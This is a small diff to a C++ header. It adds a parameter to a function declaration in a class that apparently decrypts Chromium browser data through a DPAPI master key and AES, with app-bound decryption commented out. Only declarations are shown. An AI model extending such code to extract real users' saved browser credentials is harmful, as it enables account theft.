@@ -20,7 +20,7 @@ public:
     std::string get_browser_key(std::string path);
     std::string read_json(const std::string& filePath);
     DATA_BLOB* UnportectMasterKey(std::string MasterString);
-    std::string AESDecrypter(std::vector<BYTE> EncryptedBlob);
+    std::string AESDecrypter(std::vector<BYTE> EncryptedBlob, std::string identifier);
 
     //bool ChromiumAppBoundDecryptorInit(std::string key);
     //std::string AESDecrypterAppBound(std::vector<BYTE> EncryptedBlob);
